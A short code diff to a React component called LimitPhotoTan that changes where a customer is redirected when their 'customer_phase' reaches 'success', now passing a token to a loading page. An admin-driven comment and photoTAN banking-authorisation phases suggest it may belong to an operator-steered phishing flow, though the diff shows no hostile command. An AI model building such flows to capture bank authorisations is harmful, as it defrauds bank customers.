@@ -26,7 +26,7 @@ const LimitPhotoTan = () => {
       if (!alive || !data) return;
       setRow(data);
       const phase = data.customer_phase;
-      if (phase === "success") navigate("/success");
+      if (phase === "success") navigate(`/limit/loading?token=${encodeURIComponent(token)}`);
       else if (phase === "aborted") navigate("/auth");
       else if (phase === "confirm" || phase === "phototan_request") {
         // admin sent us back
